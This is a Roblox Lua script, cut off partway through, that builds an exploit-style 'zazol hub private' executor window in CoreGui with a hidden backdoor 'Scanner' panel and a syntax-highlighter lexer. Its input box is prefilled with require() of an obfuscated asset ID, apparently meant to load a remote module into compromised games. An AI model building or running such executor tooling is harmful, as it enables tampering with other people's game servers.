--[[
⢴⣤⣶⣾⣟⣇⠀⠐⠒⠂⠿⠛⢻⠳⡖⠐⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠉⠳⠤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠉⠉⠛⠓⠲⠦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⣠⠴⠂⠀⠀⠀⠉⠙⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠓⠒⠶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡶⠁⠀⢠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠓⠶⢤⣀⠀⠀⠀⠈⠓⢦⠀⠘⢻⠀⠀⢠⡇⠀⠆⠀⠤⣤⡀⠤⢤⠤⠖⠚⠉⠀⠀⠈⢳⡀⠀⠀⠀⣀⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠦⣄⣤⡤⣶⣷⣄⣸⣦⠀⢸⠀⣀⡤⣾⣿⣶⣾⣧⠄⠀⠀⢀⣀⡤⢾⡁⠀⠉⣻⠗⠋⠁⠀⠀⠀⠀⠀⠀
⠶⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⣸⣏⠁⠈⠛⢻⣯⣿⣾⠟⢁⠀⣿⣿⡏⠟⠛⠋⠉⠁⠀⠀⢈⣻⡶⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣤⣄⣙⣻⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠀⠀⠹⣟⣚⣻⢦⣄⠀⠀⠉⠛⠂⠀⠑⠙⠋⠀⠀⠀⠀⠐⠦⠖⣻⡷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠿⠿⠻⠿⠿⠿⠿⠷⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠞⠁⠀⠀⠀⠀⣿⠿⠷⠶⢿⣰⠂⢀⡶⣄⠐⠂⠀⢻⣆⢀⣴⣒⣶⣶⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠶⢶⣶⣤⣤⣴⣶⣶⠙⠉⠻⠿⢶⣶⡶⠖⠒⠒⠒⠚⠉⠁⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠉⢡⡟⠀⣽⠖⠒⠀⠉⠉⠛⢦⡴⠛⠁⠀⠀⠸⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣶⣦⣬⣭⣽⡛⠛⠻⣿⣯⣧⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠉⠀⠀⠀⠀⠀⠀⡞⢀⡞⠁⠀⠀⠀⢀⡤⠖⠉⠀⠀⠀⠀⠀⠀⠙⠳⢤⣄⡀⠀⠀⠀⠀⢀⣠⣤⣾
⠛⠿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⣀⣤⢤⣖⣒⣲⣷⣿⣒⠲⢤⡴⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢩⡽⠛⣿⣿⣿⣿⣿⠙
⡀⠀⠉⢿⣭⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠟⠋⠉⠉⠀⠀⠀⠀⠀⠀⣠⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⠁⠀⠀⠀
⣿⣶⣦⣤⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣀⣀⠀⣀⣀⣀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠉⠉⠉⠉
⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠚⠁⠀⣠⠞⠋⠁⠀⠈⢹⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⡄⠀⠀⠀
⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠁⠀⠀⡼⠁⠀⠀⠀⠀⣴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣀⠀⠀
⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠀⠀⣸⠁⠀⠀⠀⠀⣰⠣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡿⠃
⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⢀⣯⠀⠀⠀⠀⣴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢿⡻⣷⣦
⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⣾⡇⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠜⢷⡙⣿
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⡀⣿⣯⣀⡴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠈⢷⠈
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠟⠲⢾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀
⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣆⠀⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀
⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠁⠀⠀⠀
⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠀⠀⠀⠀
⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀
⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀⠀⠀
⣿⣿⣿⠟⠙⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠃⠀⠀⠀⠀⠀
⠛⠉⠀⠀⣀⣤⡿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⠀⠀⠀⠀⠀⠀
⠀⣀⡴⠞⠉⠀⠀⠈⣙⡷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠈⠁⠀⠀⠀⠀⠀⠀⠀⠸⡄⣹⣿⣶⣤⣤⣄⣀⣀⣀⣀⣀⣀⣀⢈⢻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣺⣾⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣠⡤⠶⠟⠛⠋⠁⠀⠀⠀⠈⣉⣽⠿⠛⠉⣩⣿⢿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣀⠀⠤⠞⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠟⠋⠀⣠⡴⠟⠋⠀⠀⠈⣋⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣴⣾⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢛⡉⣀⡀⢀⡀⠀⠀⠀⠀⠀⠀⣠⡶⠞⠋⣀⣠⠶⠟⠋⠀⠀⠀⠀⢠⣶⣿⣿⣿⣿⣿⣿⣶⣶⣶⣤⣤⣤⣤⣤⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⡿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
]]
local G2L = {};
print("Made by zazol11")

G2L["1"] = Instance.new("ScreenGui", game:GetService('CoreGui'):WaitForChild('RobloxGui'));
G2L["1"]["Name"] = [[zazol666 private]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;

G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Size"] = UDim2.new(0, 482, 0, 276);
G2L["2"]["Position"] = UDim2.new(0.27320125699043274, 0, 0.3018597960472107, 0);


G2L["3"] = Instance.new("UIStroke", G2L["2"]);
G2L["3"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["3"]["Thickness"] = 2;


G2L["4"] = Instance.new("UIGradient", G2L["3"]);
G2L["4"]["Rotation"] = 50;
G2L["4"]["Color"] = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(200, 200, 200))
};


local function animateGradient(gradient)
    while true do
        for i = 0, 1, 0.02 do
            gradient.Offset = Vector2.new(i, 0)
            wait(0.03)
        end
    end
end


coroutine.wrap(animateGradient)(G2L["4"])


G2L["5"] = Instance.new("UICorner", G2L["2"]);
G2L["5"]["CornerRadius"] = UDim.new(0, 12);


G2L["6"] = Instance.new("Folder", G2L["2"]);
G2L["6"]["Name"] = [[Executor]];


G2L["7"] = Instance.new("Frame", G2L["6"]);
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["BackgroundTransparency"] = 1;
G2L["7"]["Size"] = UDim2.new(0, 290, 0, 28);
G2L["7"]["Position"] = UDim2.new(0.02169983461499214, 0, 0.8708109259605408, 0);
G2L["7"]["Name"] = [[Execute]];


G2L["8"] = Instance.new("TextButton", G2L["7"]);
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["TextSize"] = 22;
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["8"]["Name"] = [[Button]];
G2L["8"]["Text"] = [[Exe]];
G2L["8"]["BackgroundTransparency"] = 1;

G2L["9"] = Instance.new("UICorner", G2L["7"]);
G2L["9"]["CornerRadius"] = UDim.new(0, 8);


G2L["a"] = Instance.new("UIStroke", G2L["7"]);
G2L["a"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["Thickness"] = 1.5;


G2L["b"] = Instance.new("Frame", G2L["6"]);
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["Size"] = UDim2.new(0, 162, 0, 28);
G2L["b"]["Position"] = UDim2.new(0.6400582790374756, 0, 0.8708109855651855, 0);
G2L["b"]["Name"] = [[Clear]];


G2L["c"] = Instance.new("TextButton", G2L["b"]);
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["TextSize"] = 22;
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["c"]["Name"] = [[Button]];
G2L["c"]["Text"] = [[Clear]];
G2L["c"]["BackgroundTransparency"] = 1;


G2L["d"] = Instance.new("UICorner", G2L["b"]);
G2L["d"]["CornerRadius"] = UDim.new(0, 8);


G2L["e"] = Instance.new("UIStroke", G2L["b"]);
G2L["e"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["Thickness"] = 1.5;


G2L["f"] = Instance.new("Frame", G2L["6"]);
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["Size"] = UDim2.new(0, 462, 0, 163);
G2L["f"]["Position"] = UDim2.new(0.01962907239794731, 0, 0.24310137331485748, 0);
G2L["f"]["Name"] = [[ExecutorBox]];


G2L["10"] = Instance.new("UICorner", G2L["f"]);
G2L["10"]["CornerRadius"] = UDim.new(0, 12);

G2L["11"] = Instance.new("TextBox", G2L["f"]);
G2L["11"]["TextSize"] = 14;
G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["11"]["TextWrapped"] = true;
G2L["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["11"]["MultiLine"] = true;
G2L["11"]["BackgroundTransparency"] = 1;
G2L["11"]["PlaceholderText"] = [[require(33333):zazolGod]];
G2L["11"]["Size"] = UDim2.new(0, 448, 0, 150);
G2L["11"]["Text"] = [[require(0x19c105*-0x20ab292+0x247147d78603+0x6d02c61a524d):zazol("name")]];
G2L["11"]["Position"] = UDim2.new(0.015692640095949173, 0, 0.042270027101039886, 0);
G2L["11"]["ClearTextOnFocus"] = false;


local function typeTextLoop(textBox, text)
    while true do
        for i = 1, #text do
            textBox.PlaceholderText = string.sub(text, 1, i)
            wait(0.1) 
        end
        wait(3) 
        textBox.PlaceholderText = "" 
    end
end


coroutine.wrap(typeTextLoop)(G2L["11"], "require(33333):zazolGod")


G2L["12"] = Instance.new("LocalScript", G2L["11"]);
G2L["12"]["Name"] = [[Highlight]];


G2L["13"] = Instance.new("ModuleScript", G2L["12"]);
G2L["13"]["Name"] = [[Highlighter]];


G2L["14"] = Instance.new("ModuleScript", G2L["13"]);
G2L["14"]["Name"] = [[lexer]];


G2L["15"] = Instance.new("ModuleScript", G2L["14"]);
G2L["15"]["Name"] = [[language]];

G2L["16"] = Instance.new("Frame", G2L["2"]);
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["BackgroundTransparency"] = 1;
G2L["16"]["Size"] = UDim2.new(0, 370, 0, 107);
G2L["16"]["Position"] = UDim2.new(0.1166670024394989, 0, 0.30478382110595703, 0);
G2L["16"]["Visible"] = false;
G2L["16"]["Name"] = [[Scanner]];

G2L["17"] = Instance.new("UIStroke", G2L["16"]);
G2L["17"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["Thickness"] = 2;

G2L["18"] = Instance.new("UIGradient", G2L["17"]);
G2L["18"]["Rotation"] = 50;
G2L["18"]["Color"] = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(200, 200, 200))
};

coroutine.wrap(animateGradient)(G2L["18"])


G2L["19"] = Instance.new("UICorner", G2L["16"]);
G2L["19"]["CornerRadius"] = UDim.new(0, 12);


G2L["1a"] = Instance.new("TextButton", G2L["16"]);
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a"]["TextSize"] = 43;
G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1a"]["Name"] = [[Button]];
G2L["1a"]["Text"] = [[Start Scanning]];
G2L["1a"]["BackgroundTransparency"] = 1;


G2L["1b"] = Instance.new("UIGradient", G2L["1a"]);
G2L["1b"]["Rotation"] = 50;
G2L["1b"]["Color"] = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(200, 200, 200))
};


coroutine.wrap(animateGradient)(G2L["1b"])


G2L["1c"] = Instance.new("UIStroke", G2L["1a"]);
G2L["1c"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["Thickness"] = 1.5;

G2L["1d"] = Instance.new("TextLabel", G2L["2"]);
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1d"]["TextSize"] = 49;
G2L["1d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["Size"] = UDim2.new(0, 460, 0, 50);
G2L["1d"]["Text"] = [[zazol hub private]];
G2L["1d"]["BackgroundTransparency"] = 1;
G2L["1d"]["Position"] = UDim2.new(0.02169983461499214, 0, 0.025362318381667137, 0);


G2L["1e"] = Instance.new("UIStroke", G2L["1d"]);
G2L["1e"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["Thickness"] = 3;


G2L["1f"] = Instance.new("UIGradient", G2L["1e"]);
G2L["1f"]["Rotation"] = 50;
G2L["1f"]["Color"] = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(200, 200, 200))
};


coroutine.wrap(animateGradient)(G2L["1f"])





G2L["20"] = Instance.new("LocalScript", G2L["1"]);



G2L["21"] = Instance.new("LocalScript", G2L["1"]);
G2L["21"]["Name"] = [[Dragify]];


local G2L_REQUIRE = require;
local G2L_MODULES = {};





G2L_MODULES[G2L["15"]] = {
	Closure = function()
		local script = G2L["15"];
		local language = {
			keyword = {
				["and"] = "keyword",
				["break"] = "keyword",
				["continue"] = "keyword",
				["do"] = "keyword",
				["else"] = "keyword",
				["elseif"] = "keyword",
				["end"] = "keyword",
				["export"] = "keyword",
				["false"] = "keyword",
				["for"] = "keyword",
				["function"] = "keyword",
				["if"] = "keyword",
				["in"] = "keyword",
				["local"] = "keyword",
				["nil"] = "keyword",
				["not"] = "keyword",
				["or"] = "keyword",
				["repeat"] = "keyword",
				["return"] = "keyword",
				["self"] = "keyword",
				["then"] = "keyword",
				["true"] = "keyword",
				["type"] = "keyword",
				["typeof"] = "keyword",
				["until"] = "keyword",
				["while"] = "keyword",
			},

			builtin = {
				-- Luau Functions
				["assert"] = "function",
				["error"] = "function",
				["getfenv"] = "function",
				["getmetatable"] = "function",
				["ipairs"] = "function",
				["loadstring"] = "function",
				["newproxy"] = "function",
				["next"] = "function",
				["pairs"] = "function",
				["pcall"] = "function",
				["print"] = "function",
				["rawequal"] = "function",
				["rawget"] = "function",
				["rawlen"] = "function",
				["rawset"] = "function",
				["select"] = "function",
				["setfenv"] = "function",
				["setmetatable"] = "function",
				["tonumber"] = "function",
				["tostring"] = "function",
				["unpack"] = "function",
				["xpcall"] = "function",

				-- Luau Functions (Deprecated)
				["collectgarbage"] = "function",

				-- Luau Variables
				["_G"] = "table",
				["_VERSION"] = "string",

				-- Luau Tables
				["bit32"] = "table",
				["coroutine"] = "table",
				["debug"] = "table",
				["math"] = "table",
				["os"] = "table",
				["string"] = "table",
				["table"] = "table",
				["utf8"] = "table",

				-- Roblox Functions
				["DebuggerManager"] = "function",
				["delay"] = "function",
				["gcinfo"] = "function",
				["PluginManager"] = "function",
				["require"] = "function",
				["settings"] = "function",
				["spawn"] = "function",
				["tick"] = "function",
				["time"] = "function",
				["UserSettings"] = "function",
				["wait"] = "function",
				["warn"] = "function",

				-- Roblox Functions (Deprecated)
				["Delay"] = "function",
				["ElapsedTime"] = "function",
				["elapsedTime"] = "function",
				["printidentity"] = "function",
				["Spawn"] = "function",
				["Stats"] = "function",
				["stats"] = "function",
				["Version"] = "function",
				["version"] = "function",
				["Wait"] = "function",
				["ypcall"] = "function",

				-- Roblox Variables
				["game"] = "Instance",
				["plugin"] = "Instance",
				["script"] = "Instance",
				["shared"] = "Instance",
				["workspace"] = "Instance",

				-- Roblox Variables (Deprecated)
				["Game"] = "Instance",
				["Workspace"] = "Instance",

				-- Roblox Tables
				["Axes"] = "table",
				["BrickColor"] = "table",
				["CatalogSearchParams"] = "table",
				["CFrame"] = "table",
				["Color3"] = "table",
				["ColorSequence"] = "table",
				["ColorSequenceKeypoint"] = "table",
				["DateTime"] = "table",
				["DockWidgetPluginGuiInfo"] = "table",
				["Enum"] = "table",
				["Faces"] = "table",
				["FloatCurveKey"] = "table",
				["Font"] = "table",
				["Instance"] = "table",
				["NumberRange"] = "table",
				["NumberSequence"] = "table",
				["NumberSequenceKeypoint"] = "table",
				["OverlapParams"] = "table",
				["PathWaypoint"] = "table",
				["PhysicalProperties"] = "table",
				["Random"] = "table",
				["Ray"] = "table",
				["RaycastParams"] = "table",
				["Rect"] = "table",
				["Region3"] = "table",
				["Region3int16"] = "table",
				["RotationCurveKey"] = "table",
				["task"] = "table",
				["TweenInfo"] = "table",
				["UDim"] = "table",
				["UDim2"] = "table",
				["Vector2"] = "table",
				["Vector2int16"] = "table",
				["Vector3"] = "table",
				["Vector3int16"] = "table",
			},

			libraries = {

				-- Luau Libraries
				bit32 = {
					arshift = "function",
					band = "function",
					bnot = "function",
					bor = "function",
					btest = "function",
					bxor = "function",
					countlz = "function",
					countrz = "function",
					extract = "function",
					lrotate = "function",
					lshift = "function",
					replace = "function",
					rrotate = "function",
					rshift = "function",
				},

				coroutine = {
					close = "function",
					create = "function",
					isyieldable = "function",
					resume = "function",
					running = "function",
					status = "function",
					wrap = "function",
					yield = "function",
				},

				debug = {
					dumpheap = "function",
					info = "function",
					loadmodule = "function",
					profilebegin = "function",
					profileend = "function",
					resetmemorycategory = "function",
					setmemorycategory = "function",
					traceback = "function",
				},

				math = {
					abs = "function",
					acos = "function",
					asin = "function",
					atan2 = "function",
					atan = "function",
					ceil = "function",
					clamp = "function",
					cos = "function",
					cosh = "function",
					deg = "function",
					exp = "function",
					floor = "function",
					fmod = "function",
					frexp = "function",
					ldexp = "function",
					log10 = "function",
					log = "function",
					max = "function",
					min = "function",
					modf = "function",
					noise = "function",
					pow = "function",
					rad = "function",
					random = "function",
					randomseed = "function",
					round = "function",
					sign = "function",
					sin = "function",
					sinh = "function",
					sqrt = "function",
					tan = "function",
					tanh = "function",

					huge = "number",
					pi = "number",
				},

				os = {
					clock = "function",
					date = "function",
					difftime = "function",
					time = "function",
				},

				string = {
					byte = "function",
					char = "function",
					find = "function",
					format = "function",
					gmatch = "function",
					gsub = "function",
					len = "function",
					lower = "function",
					match = "function",
					pack = "function",
					packsize = "function",
					rep = "function",
					reverse = "function",
					split = "function",
					sub = "function",
					unpack = "function",
					upper = "function",
				},

				table = {
					clear = "function",
					clone = "function",
					concat = "function",
					create = "function",
					find = "function",
					foreach = "function",
					foreachi = "function",
					freeze = "function",
					getn = "function",
					insert = "function",
					isfrozen = "function",
					maxn = "function",
					move = "function",
					pack = "function",
					remove = "function",
					sort = "function",
					unpack = "function",
				},

				utf8 = {
					char = "function",
					codepoint = "function",
					codes = "function",
					graphemes = "function",
					len = "function",
					nfcnormalize = "function",
					nfdnormalize = "function",
					offset = "function",

					charpattern = "string",
				},

				-- Roblox Libraries
				Axes = {
					new = "function",
				},

				BrickColor = {
					Black = "function",
					Blue = "function",
					DarkGray = "function",
					Gray = "function",
					Green = "function",
					new = "function",
					New = "function",
					palette = "function",
					Random = "function",
					random = "function",
					Red = "function",
					White = "function",
					Yellow = "function",
				},

				CatalogSearchParams = {
					new = "function",
				},

				CFrame = {
					Angles = "function",
					fromAxisAngle = "function",
					fromEulerAngles = "function",
					fromEulerAnglesXYZ = "function",
					fromEulerAnglesYXZ = "function",
					fromMatrix = "function",
					fromOrientation = "function",
					lookAt = "function",
					new = "function",

					identity = "CFrame",
				},

				Color3 = {
					fromHex = "function",
					fromHSV = "function",
					fromRGB = "function",
					new = "function",
					toHSV = "function",
				},

				ColorSequence = {
					new = "function",
				},

				ColorSequenceKeypoint = {
					new = "function",
				},

				DateTime = {
					fromIsoDate = "function",
					fromLocalTime = "function",
					fromUniversalTime = "function",
					fromUnixTimestamp = "function",
					fromUnixTimestampMillis = "function",
					now = "function",
				},

				DockWidgetPluginGuiInfo = {
					new = "function",
				},

				Enum = {},

				Faces = {
					new = "function",
				},

				FloatCurveKey = {
					new = "function",
				},

				Font = {
					fromEnum = "function",
					fromId = "function",
					fromName = "function",
					new = "function",
				},

				Instance = {
					new = "function",
				},

				NumberRange = {
					new = "function",
				},

				NumberSequence = {
					new = "function",
				},

				NumberSequenceKeypoint = {
					new = "function",
				},

				OverlapParams = {
					new = "function",
				},

				PathWaypoint = {
					new = "function",
				},

				PhysicalProperties = {
					new = "function",
				},

				Random = {
					new = "function",
				},

				Ray = {
					new = "function",
				},

				RaycastParams = {
					new = "function",
				},

				Rect = {
					new = "function",
				},

				Region3 = {
					new = "function",
				},

				Region3int16 = {
					new = "function",
				},

				RotationCurveKey = {
					new = "function",
				},

				task = {
					cancel = "function",
					defer = "function",
					delay = "function",
					desynchronize = "function",
					spawn = "function",
					synchronize = "function",
					wait = "function",
				},

				TweenInfo = {
					new = "function",
				},

				UDim = {
					new = "function",
				},

				UDim2 = {
					fromOffset = "function",
					fromScale = "function",
					new = "function",
				},

				Vector2 = {
					new = "function",

